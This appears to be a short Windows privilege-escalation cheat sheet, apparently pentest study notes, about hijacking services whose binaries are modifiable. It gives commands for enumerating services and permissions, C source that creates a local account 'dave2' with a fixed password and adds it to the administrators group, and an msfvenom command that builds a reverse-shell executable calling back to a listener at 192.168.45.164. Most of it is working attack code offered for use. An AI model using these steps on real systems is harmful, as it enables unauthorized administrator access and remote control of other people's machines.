#priviledgeEscalation #windows 

🔴 F - full access is not mandatory M - modifieable is also works for authenticated users

🔴 Sometimes you can **mv** the binary if **rm** doesn't work

#### Enumerate services

```powershell
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'} | Where-Object {$_.PathName -notlike '*system32*'}
```

```powershell
Get-Service
```

#### Enumerate Permission

```powershell
Get-ACL
```

```powershell
icacls "C:\xampp\apache\bin\httpd.exe"
```

### Service Manipulation

```cmd
net stop ServiceName
```

```powershell
Restart-Service
```


#### Adding Users using a Executable

```C
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user dave2 password123! /add");
  i = system ("net localgroup administrators dave2 /add");
  
  return 0;
}
```

```bash
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```


#### Reverse Shell

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.164 LPORT=443 -f exe -o txt.exe
```

